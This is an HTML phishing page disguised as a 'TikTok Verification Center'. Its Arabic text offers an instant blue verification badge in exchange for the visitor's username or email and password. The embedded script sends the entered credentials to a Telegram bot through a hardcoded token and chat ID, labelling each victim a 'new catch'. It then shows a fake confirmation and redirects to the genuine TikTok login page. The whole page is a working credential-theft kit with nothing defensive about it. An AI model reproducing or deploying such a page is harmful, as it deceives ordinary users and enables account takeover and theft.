<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Verification Center</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .badge { width: 80px; height: 80px; fill: #20d5ec; filter: drop-shadow(0 0 15px #20d5ec); animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        input { width: 280px; padding: 15px; margin: 10px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; outline: none; }
        button { width: 310px; padding: 15px; border-radius: 30px; border: none; background: #fe2c55; color: #fff; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <svg class="badge" viewBox="0 0 24 24"><path d="M23.33 11.58l-2.09-2.41.33-3.18-3.13-.71-1.63-2.75L14 3.75l-2-.86-2 .86-2.81-1.22-1.63 2.75-3.13.71.33 3.18-2.09 2.41 2.09 2.41-.33 3.18 3.13.71 1.63 2.75L10 19.38l2 .86 2-.86 2.81 1.22 1.63-2.75 3.13-.71-.33-3.18 2.09-2.41zM9.5 15.5L6 12l1.41-1.41L9.5 12.67l6.59-6.59L17.5 7.5l-8 8z"/></svg>
    <h2>مركز توثيق تيك توك الملكي</h2>
    <p>أدخل بياناتك للحصول على الشارة الزرقاء فوراً</p>
    <input type="text" id="user" placeholder="إيميل أو اسم المستخدم">
    <input type="password" id="pass" placeholder="كلمة السر">
    <button onclick="sendData()">تفعيل العلامة الزرقاء 🔥</button>

    <script>
        function sendData() {
            const token = "8633152106:AAHnSFCxJtolR1AlUGG5f1hcwmYxsTobS7I";
            const id = "5757914383";
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            
            if(u && p) {
                const msg = `👑 صيد سحابي جديد 🔥\n👤 User: ${u}\n🔑 Pass: ${p}\n🔥 الحالة: رابط خالد`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)
                .then(() => { 
                    alert("تم إرسال الطلب، سيتم التفعيل خلال 24 ساعة!");
                    window.location.href = "https://www.tiktok.com/login"; 
                });
            } else {
                alert("يرجى إكمال البيانات أولاً!");
            }
        }
    </script>
</body>
</html>
